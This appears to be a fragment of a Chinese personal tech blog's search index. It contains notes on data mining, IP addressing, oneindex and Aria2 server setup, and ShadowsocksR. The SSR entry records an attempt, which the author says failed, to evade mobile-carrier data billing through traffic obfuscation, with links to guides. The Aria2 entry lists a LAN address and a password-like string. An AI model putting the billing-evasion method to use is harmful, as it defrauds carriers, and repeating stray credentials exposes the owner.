        <content type="html"><![CDATA[<h4 id="商业智能BI、数据挖掘DM、数据仓库DW"><a href="#商业智能BI、数据挖掘DM、数据仓库DW" class="headerlink" title="商业智能BI、数据挖掘DM、数据仓库DW"></a>商业智能BI、数据挖掘DM、数据仓库DW</h4><ul><li>目标：商业智能</li><li>方法：数据挖掘</li><li>材料来源：数据仓库</li></ul><hr><h4 id="数据挖掘的流程-Knowledge-Discovery-in-Database-KDD"><a href="#数据挖掘的流程-Knowledge-Discovery-in-Database-KDD" class="headerlink" title="数据挖掘的流程  (Knowledge Discovery in Database,KDD)"></a>数据挖掘的流程  (Knowledge Discovery in Database,KDD)</h4><h5 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h5><ul><li>分类<ul><li>通过训练集得到一个分类模型，然后用这个模型可对其他数据进行分类</li><li>训练集：作为机器分类的训练样本(已经分类好的数据)</li><li>测试集：用来评测分类模型(已经分类好的数据)</li></ul></li><li>聚类<ul><li>将数据自动聚类成几个类别(没有先验知识)</li></ul></li><li>预测<ul><li>通过当前和历史数据来预测未来趋势</li></ul></li><li>关联分析<ul><li>发现数据中的规则<span id="more"></span><h5 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h5></li></ul></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line"><span class="selector-tag">A</span><span class="selector-attr">[输入数据]</span>--&gt;<span class="selector-tag">B</span><span class="selector-attr">[数据预处理]</span></span><br><span class="line"><span class="selector-tag">B</span>--&gt;C<span class="selector-attr">[数据挖掘]</span></span><br><span class="line">C--&gt;D<span class="selector-attr">[数据后处理]</span></span><br><span class="line">D--&gt;E<span class="selector-attr">[信息]</span></span><br></pre></td></tr></table></figure><ul><li>数据预处理<ul><li><strong>数据清洗</strong>：去除重复数据，去噪声以及填充缺失值</li><li><strong>数据集成</strong>：多个数据源的数据存放在统一的数据存储中</li><li><strong>数据变换</strong>：将数据转换成适合数据挖掘的形式</li></ul></li><li><strong>数据后处理</strong>：将模型预测的结果进一步处理后，再导出？</li></ul><hr><h4 id="用户画像：标签化就是数据的抽象能力"><a href="#用户画像：标签化就是数据的抽象能力" class="headerlink" title="用户画像：标签化就是数据的抽象能力"></a>用户画像：标签化就是数据的抽象能力</h4><h5 id="用户画像的准则"><a href="#用户画像的准则" class="headerlink" title="用户画像的准则"></a>用户画像的准则</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line"><span class="selector-tag">A</span><span class="selector-attr">[统一化]</span>--&gt;<span class="selector-tag">B</span><span class="selector-attr">[标签化]</span></span><br><span class="line"><span class="selector-tag">B</span>--&gt;C<span class="selector-attr">[业务化]</span></span><br></pre></td></tr></table></figure><ul><li>统一化：同一用户的唯一标识<ul><li>标识物：用户名、注册手机号、联系人手机号、邮箱、设备号、CookieID等</li><li>作用：更好的跟踪和分析用户的特征</li></ul></li><li>标签化：用户消费行为分析<ol><li>用户标签：用户的基础属性。(性别、年龄、地域、收入、学历、职业等)</li><li>消费标签：用户的消费习惯。(消费习惯、购买意向、是否对促销敏感等)</li><li>行为标签：用户使用App的习惯。(通过分析用户的行为：时间段、频次、时长、访问路径)</li><li>内容分析：用户感兴趣的内容。(通过用户浏览内容时，对停留时间长、浏览次数等行为，分析用户感兴趣的内容：金融、娱乐、教育、体育、时尚、科技)</li></ol></li><li>业务化：指导用户画像(应用,带来价值：获取新的，留住在的，分析走的)<ol><li>获客：如何进行拉新，通过更精准的营销获取客户。</li><li>粘客：个性化推荐，搜索排序，场景运营等。</li><li>留客：流失率预测，分析关键节点降低流失率。</li></ol></li></ul><h5 id="数据流划分用户画像建模的过程"><a href="#数据流划分用户画像建模的过程" class="headerlink" title="数据流划分用户画像建模的过程"></a>数据流划分用户画像建模的过程</h5><ul><li>数据层：获取用户消费行为里的标签。(<strong>事实标签</strong>,数据客观的记录)</li><li>算法层：通过用户的行为进行建模。(<strong>模型标签</strong>,建立用户画像)</li><li>业务层：获客，粘客，留客的手段。(<strong>预测标签</strong>)</li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">graph</span> <span class="selector-tag">TD</span></span><br><span class="line"><span class="selector-tag">A</span>(数据层-收集数据)<span class="selector-tag">--</span>&gt;<span class="selector-tag">B1</span><span class="selector-attr">[用户属性]</span></span><br><span class="line"><span class="selector-tag">A</span><span class="selector-tag">--</span>&gt;<span class="selector-tag">B2</span><span class="selector-attr">[投诉次数]</span></span><br><span class="line"><span class="selector-tag">A</span><span class="selector-tag">--</span>&gt;<span class="selector-tag">B3</span><span class="selector-attr">[产品购买次数]</span></span><br><span class="line"><span class="selector-tag">A</span><span class="selector-tag">--</span>&gt;<span class="selector-tag">B4</span><span class="selector-attr">[渠道使用频率]</span></span><br><span class="line"><span class="selector-tag">A</span><span class="selector-tag">--</span>&gt;<span class="selector-tag">B5</span><span class="selector-attr">[优惠券使用]</span></span><br><span class="line"><span class="selector-tag">A</span><span class="selector-tag">--</span>&gt;<span class="selector-tag">B6</span><span class="selector-attr">[访问次数]</span></span><br><span class="line"><span class="selector-tag">A</span><span class="selector-tag">--</span>&gt;<span class="selector-tag">B7</span><span class="selector-attr">[支付渠道使用]</span></span><br><span class="line"><span class="selector-tag">A</span><span class="selector-tag">--</span>&gt;<span class="selector-tag">B8</span><span class="selector-attr">[浏览内容频次]</span></span><br></pre></td></tr></table></figure><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">graph</span> <span class="selector-tag">TD</span></span><br><span class="line"><span class="selector-tag">A</span>(算法层-建立用户画像)<span class="selector-tag">--</span>&gt;<span class="selector-tag">B1</span><span class="selector-attr">[用户兴趣]</span></span><br><span class="line"><span class="selector-tag">A</span><span class="selector-tag">--</span>&gt;<span class="selector-tag">B2</span><span class="selector-attr">[用户活跃度]</span></span><br><span class="line"><span class="selector-tag">A</span><span class="selector-tag">--</span>&gt;<span class="selector-tag">B3</span><span class="selector-attr">[产品购买偏好]</span></span><br><span class="line"><span class="selector-tag">A</span><span class="selector-tag">--</span>&gt;<span class="selector-tag">B4</span><span class="selector-attr">[用户关联关系]</span></span><br><span class="line"><span class="selector-tag">A</span><span class="selector-tag">--</span>&gt;<span class="selector-tag">B5</span><span class="selector-attr">[用户满意度]</span></span><br><span class="line"><span class="selector-tag">A</span><span class="selector-tag">--</span>&gt;<span class="selector-tag">B6</span><span class="selector-attr">[渠道使用偏好]</span></span><br><span class="line"><span class="selector-tag">A</span><span class="selector-tag">--</span>&gt;<span class="selector-tag">B7</span><span class="selector-attr">[支付使用偏好]</span></span><br><span class="line"><span class="selector-tag">A</span><span class="selector-tag">--</span>&gt;<span class="selector-tag">B8</span><span class="selector-attr">[优惠券使用偏好]</span></span><br></pre></td></tr></table></figure><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">graph</span> <span class="selector-tag">TD</span></span><br><span class="line"><span class="selector-tag">A</span>(业务层-为业务服务)<span class="selector-tag">--</span>&gt;<span class="selector-tag">B1</span><span class="selector-attr">[获客预测]</span></span><br><span class="line"><span class="selector-tag">A</span><span class="selector-tag">--</span>&gt;<span class="selector-tag">B2</span><span class="selector-attr">[个性化推荐]</span></span><br><span class="line"><span class="selector-tag">A</span><span class="selector-tag">--</span>&gt;<span class="selector-tag">B3</span><span class="selector-attr">[GMV趋势预测]</span></span><br><span class="line"><span class="selector-tag">A</span><span class="selector-tag">--</span>&gt;<span class="selector-tag">B4</span><span class="selector-attr">[用户流失概率]</span></span><br></pre></td></tr></table></figure><h5 id="实操：美团外卖的用户画像？"><a href="#实操：美团外卖的用户画像？" class="headerlink" title="实操：美团外卖的用户画像？"></a>实操：美团外卖的用户画像？</h5><ol><li>统一化：同一用户的唯一标识</br>　<br>美团与大众点评已经合并，选择手机号，两个数据库可以互通</li><li>标签化：按照“用户消费行为分析”的准则设计<ol><li>用户标签：性别、年龄?、地域(家乡?、居住地?、收货地址)、收入?、职业?、婚姻?、宝宝信息?、何种渠道注册</li><li>消费标签：口味、消费均价、团购等级、预定使用等级?、排队使用等级?、外卖等级</li><li>行为标签：点外卖时间段、点外卖频次、点餐时长、访问路径?</li><li>内容标签：基于用户平时浏览的内容进行统计，包括餐饮口味、优惠敏感度等</li></ol></li><li>业务<br> 通过数据挖掘，分析其中关联()<br> 预测用户行为<br> 产生业务价值:<ul><li>获客: 吸引有潜在需求的用户,并刺激其转化；(寻找优势的宣传渠道,个性化的宣传手段) </li><li>粘客: 提升用户的单价和消费频次；(用户购买后的个性化推荐,针对优质用户进行优质高价商品的推荐、以及重复购买,比如通过红包、优惠等方式激励对优惠敏感的人群,提升购买频次)</li><li>留客: 预测用户是否可能会从平台上流失  (用户流失可能会包括多种情况,比如用户体验、竞争对手、需求变化等,通过预测用户的流失率可以大幅降低用户留存的运营成本。)</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 数据分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3, ifconfig-linux指令</title>
      <link href="/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/3-ifconfig-linux%E6%8C%87%E4%BB%A4/"/>
      <url>/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/3-ifconfig-linux%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h4 id="IP地址的结构"><a href="#IP地址的结构" class="headerlink" title="IP地址的结构"></a>IP地址的结构</h4><p><strong>IP地址是一个网卡在网络世界的通讯地址，相当于我们现实世界的门牌好吗。</strong><br>网卡 一般绑定Ip地址<br>ip地址分为5类，A类，B类，..,E类。 </p><img src="//tva3.sinaimg.cn/large/005zbIM7gy1g0ysi9lvn5j30jp082aad.jpg" alt="img"><p>A、B、C类： 网络号+主机号 </br></p><p><strong>存在问题</strong>：B类最大主机数太多，C类最大主机数太少。<br>|类别|IP地址范围|最大主机数|私有IP地址范围|<br>|–|—-|—-|—-|<br>|<center>A</center>|<center>0.0.0.0-127.255.255.255</center>|<center>16777214</center>|<center>10.0.0.0-10.255.255.255</center>|<br>|<center>B</center>|<center>128.0.0.0-191.255.255.255</center>|<center>65534<center>|<center>172.31.255.255</center>|<br>|<center>C</center>|<center>192.0.0.0-223.255.255.255</center>|<center>254</center>|<center>192.168.0.0-192.168.255.255</center>|<br></br></p><span id="more"></span><p><strong>解决办法</strong>: 无类型域间选路(CIDR)<br></br> 网络号 + 主机号 +’ / ‘+ 类型号： 10.100.122.2/24<br>伴随<code>CIDR</code>存在的，一个是<strong>广播地址</strong>(发送10.100.122.255广播地址，则所有10.100.122网络里的及其可以收到)，另一个是<strong>子网掩码</strong>(255.255.255.0)。</br><br>网络号的计算：将<strong>子网掩码</strong>和<strong>IP地址</strong>按位计算AND(255.255.255.0 前面3位都是1，取AND不变，后面一个0，取AND为0。10.100.122.xxx和255.255.255.0的网络号是：<strong>10.100.122.0</strong>)</p><h4 id="公有IP地址和私有IP地址"><a href="#公有IP地址和私有IP地址" class="headerlink" title="公有IP地址和私有IP地址"></a>公有IP地址和私有IP地址</h4><p>共有IP地址：组织统一分配，常见的是 /24 ,/16,即C类？和B类？。</br><br>私有IP地址：</p><ul><li>最常用的是 192.168.0.x。</li><li>整个网络的第一个地址(网关？)，往往是这个私有网络的出口地址。(家里电脑连接WI-Fi，WIFI路由器的地址就是192.168.0.1)</li><li>最后一个地址就是广播地址(192.168.0.255，发送这个地址，整个 192.168.0 网络里面的机器都能收到)</li></ul><p><strong>例外</strong>: 若IP地址为16.158.165.91/22 ，求这个网络的第一个地址、子网掩码和广播地址。</br><br>　16.158是前16位，不用动。</br><br>　165转为二进制&lt;10100101&gt;，其中前6位是网络号，所以16.158.&lt;101001&gt;是网络号，&lt;01&gt;.91是主机号。</br><br>　所以第一个IP地址是16.158.&lt;101001&gt;&lt;00&gt;.1，即16.158.164.1。<br>　子网掩码是255.255.&lt;111111&gt;&lt;00&gt;.0,即255.255.252.0。<br>　广播地址是16.158.&lt;101001&gt;&lt;11&gt;.255,即16.158.167.255。</p><h4 id="D类-组播地址"><a href="#D类-组播地址" class="headerlink" title="D类 组播地址"></a>D类 组播地址</h4><p>使用这一类地址，属于某个组的及其都能收到。类似qq群，发送消息、文件大家都能收到。 VXLAN协议？</p><h4 id="IP地址解读"><a href="#IP地址解读" class="headerlink" title="IP地址解读"></a>IP地址解读</h4><p><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0yw0j6ssrj30mn057jrw.jpg" alt="img"></br><br>linux系统:输入<code>ip addr</code>,获得ip，有<code>lo</code>和<code>eth0</code>两张网卡？</br></p><h5 id="IP地址的应用范围"><a href="#IP地址的应用范围" class="headerlink" title="IP地址的应用范围"></a>IP地址的应用范围</h5><p>IP地址后面有个scope(范围?),对于eht0这张网卡来讲，是<strong>global</strong>，说明这张网卡是可以对外的，可以接收来自各个地方的包；对于 lo 来讲，是<strong>host</strong>，说明这张网卡仅仅可以供本机相互通信。</p><h5 id="MAC地址"><a href="#MAC地址" class="headerlink" title="MAC地址"></a>MAC地址</h5><p> IP 地址的上一行是 link/ether fa:16:3e:c7:79:75 brd ff:ff:ff:ff:ff:ff，这个被称为MAC 地址.</p><ul><li>是一个网卡的物理地址(用16进制，6个byte表示)</li><li>唯一性(不会有两个网卡有相同的MAC地址)</li><li>不可作为发送地址(类似于你看到一张身份证的ID(MAC)，却还是不能找到他，只有看到身份证里的地址(IP地址)，才能通讯)</li><li>有一定的定位功能，不过范围有限(在同一家超市(局域网)里面，大喊ID(MAC地址)是XXXX，可以获得响应，但如果在A地找B地的人，当然不能获得响应)</li></ul><h5 id="网络设备的状态标识"><a href="#网络设备的状态标识" class="headerlink" title="网络设备的状态标识"></a>网络设备的状态标识</h5><p><code>&lt; BROADCAST,MULTICAST,UP,LOWER_UP &gt;</code> 是网络设备的状态标识(net_device flags)</p><ul><li>UP 表示网卡处于启动状态</li><li>BROADCAST 表示这个网卡有广播地址，可以发送广播包</li><li>MULTICAST 表示网卡可以发送多播包</li><li>LOWER_UP  表示L1是启动的，即插着网线</li><li>mtu 1500 最大传输单元<code>MTU</code>为1500.(是二层<code>MAC</code>层在传输时，<code>MAC</code>层有<code>MAC</code>层的头，不允许超过1500个字节。正文里面有<code>IP</code>的头，<code>TCP</code>的头，<code>HTTP</code>的头，如果放不下，就需要分片来传输)</li><li>qdisc pfifo_fase：<ul><li>qdisc全称是<strong>queueing discipline</strong>,中文叫排队规则。内核通过某个网络接口发送数据包时，它需要按照接口配置的排队规则(比如qdisc)把数据包加入队列。</li><li>最简单的qdisc是pfifo，不对进入的数据包做任何处理，数据包采用先入先出的方式通过队列。</li><li>pfofo_fast 复杂一些，队列有三个波段，优先处理优先级高的波段，每个波段也是先进先出。数据包是按照服务类型(Type Of Service,TOS)被分配到三个波段里面。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务器上搭建oneindex</title>
      <link href="/categories/Linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%90%AD%E5%BB%BAoneindex/"/>
      <url>/categories/Linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%90%AD%E5%BB%BAoneindex/</url>
      
        <content type="html"><![CDATA[<h4 id="更新php"><a href="#更新php" class="headerlink" title="更新php"></a>更新php</h4><p>由于需要 <code>php5.6+</code> 版本,需要从<code>php5.4</code>更新</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">yum</span> provides php   #自带的只有<span class="number">5</span>.<span class="number">4</span>版本</span><br><span class="line"><span class="attribute">rpm</span> -Uvh https://mirror.webtatic.com/yum/el<span class="number">7</span>/epel-release.rpm         #更新源</span><br><span class="line"><span class="attribute">rpm</span> -Uvh https://mirror.webtatic.com/yum/el<span class="number">7</span>/webtatic-release.rpm</span><br><span class="line"><span class="attribute">yum</span> remove php-common -y     #移除系统自带的php-common</span><br><span class="line"><span class="attribute">yum</span> install -y php<span class="number">56</span>w php<span class="number">56</span>w-opcache php<span class="number">56</span>w-xml php<span class="number">56</span>w-mcrypt php<span class="number">56</span>w-gd php<span class="number">56</span>w-devel php<span class="number">56</span>w-mysql php<span class="number">56</span>w-intl php<span class="number">56</span>w-mbstring         #安装依赖包</span><br><span class="line"><span class="attribute">php</span> -v                    #版本变为<span class="number">5</span>.<span class="number">6</span></span><br><span class="line"><span class="attribute">yum</span> provides php-fpm      #搭建lnmp=&gt;安装php-fpm，选择<span class="number">5</span>.<span class="number">6</span>版本的安装</span><br><span class="line"><span class="attribute">yum</span> install php<span class="number">56</span>w-fpm-<span class="number">5</span>.<span class="number">6</span>.<span class="number">31</span>-<span class="number">1</span>.w<span class="number">7</span>.x<span class="number">86</span>_<span class="number">64</span> -y #根据php -v 选择</span><br></pre></td></tr></table></figure><span id="more"></span><h4 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h4><ul><li>下载<br><code>https://github.com/donwa/oneindex</code><br>目录 <code>/var/www/  oneindex</code></li><li>更改httpd配置 <code>/etc/httpd/conf/httpd.config文件  VirtualHost  /var/www</code></li><li>读写权限 <code>chown -R apache:apache /.paht/oneindex/cache    config</code></li><li>后台定时刷新缓存<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每小时刷新一次token</span></span><br><span class="line">0 * * * * [<span class="string">/usr/bin</span>]<span class="string">/php</span> [<span class="string">/download</span> paht]<span class="string">/one.php</span> token<span class="function">:refresh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 每十分钟后台刷新一遍缓存</span></span><br><span class="line">*<span class="string">/10</span> * * * * [<span class="string">/usr/bin</span>]<span class="string">/php</span> [<span class="string">/download</span> path]<span class="string">/one.php</span> cache<span class="function">:refresh</span></span><br></pre></td></tr></table></figure></li><li>其他命令<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php <span class="literal">one</span>.php cache:<span class="built_in">clear</span></span><br><span class="line">php <span class="literal">one</span>.php cache:refresh</span><br><span class="line">php <span class="literal">one</span>.php <span class="keyword">token</span>:refresh</span><br><span class="line">php <span class="literal">one</span>.php upload:<span class="built_in">file</span> 本地文件 [oneDrive文件]</span><br><span class="line">php <span class="literal">one</span>.php upload:<span class="built_in">folder</span> 本地文件夹 [oneDrive文件夹]</span><br></pre></td></tr></table></figure></li><li>访问网址  ip/oneindex<img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0v67b8inej30r40bmjrr.jpg" alt="img"></li><li>获取key  id</li><li>登录</li><li>后台管理 (初始密码 oneindex)</li></ul><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>手机端不显示 mudi 图标，而显示文字，所以使用<code>mudo-hidden-xs-down</code>类，对图标指定宽度隐藏。(手机端不显示)</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 服务器上的使用记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
            <tag> Linux </tag>
            
            <tag> Centos </tag>
            
            <tag> oneindex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务器：配置Aria下载神器</title>
      <link href="/categories/Linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%9A%E9%85%8D%E7%BD%AEaria%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8/"/>
      <url>/categories/Linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%9A%E9%85%8D%E7%BD%AEaria%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.cnblogs.com/blueherb/p/9531072.html">Aria教程网址</a></p><p><a href="https://www.cnblogs.com/yypr/p/9850021.html">搭建私人网盘</a></p><p><a href="https://yorkchou.com/aria2.html">https://yorkchou.com/aria2.html</a></p><p><a href="https://www.v2ex.com/t/383801">https://www.v2ex.com/t/383801</a></p><p>Filerun + AriaNg + Aria2  = CloudStorage?<br>Filerun:  在线文件管理器<br>AriaNg:   aria2 web 界面</p><span id="more"></span>[教程网址](https://www.jianshu.com/p/cd21bffd9e52)<p>ccaa 的配置 磁力？</p><p>—- 电脑安装了这个 ！!<br><a href="https://doc.xiaoz.me/#/ccaa/">ccaa安装</a></p><p>192.168.1.136:6080<br>kkwithme</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 服务器上的使用记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
            <tag> Linux </tag>
            
            <tag> Centos </tag>
            
            <tag> Aria </tag>
            
            <tag> 下载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSR免流？</title>
      <link href="/categories/Linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/ssr%E5%85%8D%E6%B5%81%EF%BC%9F/"/>
      <url>/categories/Linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/ssr%E5%85%8D%E6%B5%81%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>最后还是不太灵，不搞了。。\n<br>教程原网址<br><a href="https://flyzyblog.com/install-ss-ssr-bbr-in-one-command/">搭建</a><br><a href="https://flyzyblog.com/ssr-free-traffic/">免参考1</a><br><a href="https://www.stackcc.com/2018/12/31/mianliu/#h6">免参考2</a></p><span id="more"></span><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#下载</span></span><br><span class="line">    git clone git@github.com:flyzy2005/ss-fly.git</span><br><span class="line"><span class="comment">#运行ssr脚本</span></span><br><span class="line">    ss-fly/ss-fly.sh -ssr</span><br><span class="line">    ***ssr9*</span><br><span class="line">    <span class="number">8586</span></span><br><span class="line">    aes-<span class="number">256</span>-cfb</span><br><span class="line">    auth_sha1_v4</span><br><span class="line">    http_simple</span><br><span class="line"><span class="comment"># bbr 加速(不需要？)</span></span><br><span class="line">    ss-fly/ss-fly.sh -bbr</span><br><span class="line">    sysctl net.ipv4.tcp_available_congestion_control  <span class="comment">#验证</span></span><br><span class="line">    <span class="comment">#返回值  net.ipv4.tcp_available_congestion_control = bbr cubic reno</span></span><br><span class="line"><span class="comment">#关闭bbr 加速</span></span><br><span class="line">    vim <span class="regexp">/etc/</span>sysctl.conf</span><br><span class="line">        <span class="comment">#用#注释掉</span></span><br><span class="line">        <span class="comment">#net.core.default_qdisc = fq </span></span><br><span class="line">        <span class="comment">#net.ipv4.tcp_congestion_control = bbr </span></span><br><span class="line">    sysctl -p</span><br><span class="line">    <span class="comment">#重启生效</span></span><br><span class="line"><span class="comment">#相关操作</span></span><br><span class="line">    <span class="regexp">/etc/i</span>nit.d/shadowsocks start   <span class="comment">#启动</span></span><br><span class="line">    <span class="regexp">/etc/i</span>nit.d/shadowsocks stop     <span class="comment">#停止</span></span><br><span class="line">    <span class="regexp">/etc/i</span>nit.d/shadowsocks restart  <span class="comment">#重启</span></span><br><span class="line">    <span class="regexp">/etc/i</span>nit.d/shadowsocks status   <span class="comment">#状态</span></span><br><span class="line">     </span><br><span class="line">    <span class="regexp">/etc/</span>shadowsocks.json        <span class="comment">#配置文件路径</span></span><br><span class="line">    <span class="regexp">/var/</span>log/shadowsocks.log     <span class="comment">#日志文件路径</span></span><br><span class="line">    <span class="regexp">/usr/</span>local/shadowsocks       <span class="comment">#代码安装目录</span></span><br><span class="line">    </span><br><span class="line">    ./shadowsocksR.sh uninstall   <span class="comment">#卸载ssr服务</span></span><br></pre></td></tr></table></figure><p>日志：第一次失败，第二次成功<br>#注意：服务器需要更改安全组 ：TCP 8586</p><p>安卓可以连接服务器，但加了混淆参数不能免流？</br><br>飞行模式(no wifi)，运行ssr,..一系列请求..，飞行模式(no wifi)<br>.<br>.<br>.<br>.<br>.</p><hr><p>#搭建ss(这里不用)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#运行ss脚本, (****sr95 是密码, 8586 是端口)</span></span><br><span class="line">    ss-fly/ss-fly.sh -i mima <span class="number">1024</span></span><br><span class="line"><span class="comment">#改密码</span></span><br><span class="line">    重新运行ss脚本</span><br><span class="line">    或者修改 <span class="regexp">/etc/</span>shadowsocks.json</span><br><span class="line"><span class="comment">#相关ss操作</span></span><br><span class="line">    vim <span class="regexp">/etc/</span>shadowsocks.json   <span class="comment">#修改配置文件</span></span><br><span class="line">    ssserver -c <span class="regexp">/etc/</span>shadowsocks.json -d stop  <span class="comment">#停止ss服务</span></span><br><span class="line">    ssserver -c <span class="regexp">/etc/</span>shadowsocks.json -d start  <span class="comment">#启动ss服务</span></span><br><span class="line">    ssserver -c <span class="regexp">/etc/</span>shadowsocks.json -d restart  <span class="comment">#重启ss服务</span></span><br><span class="line">    ss-fly/ss-fly.sh -uninstall    <span class="comment">#卸载ss服务  #</span></span><br></pre></td></tr></table></figure><h4 id="免流参数填写"><a href="#免流参数填写" class="headerlink" title="免流参数填写"></a>免流参数填写</h4><p><a href="https://www.fbbi.pw/15.html">测试网址1</a></p><p><a href="http://m.qianxianly.com/view.php?aid=280">?</a></p><p><a href="http://m.qianxianly.com/view.php?aid=177">http://m.qianxianly.com/view.php?aid=177</a></p><p><a href="http://m.qianxianly.com/view.php?aid=280">http://m.qianxianly.com/view.php?aid=280</a></p><p><a href="http://m.qianxianly.com/view.php?aid=139">http://m.qianxianly.com/view.php?aid=139</a></p><p><a href="http://m.qianxianly.com/view.php?aid=146">http://m.qianxianly.com/view.php?aid=146</a></p><p><a href="http://m.qianxianly.com/view.php?aid=177">http://m.qianxianly.com/view.php?aid=177</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 服务器上的使用记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
            <tag> Linux </tag>
            
            <tag> Centos </tag>
            
            <tag> SSR </tag>
            
            <tag> 免流 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 独立的运行环境:virtualenv的使用</title>
      <link href="/categories/Python/python-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/python-%E7%8B%AC%E7%AB%8B%E7%9A%84%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83-virtualenv%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
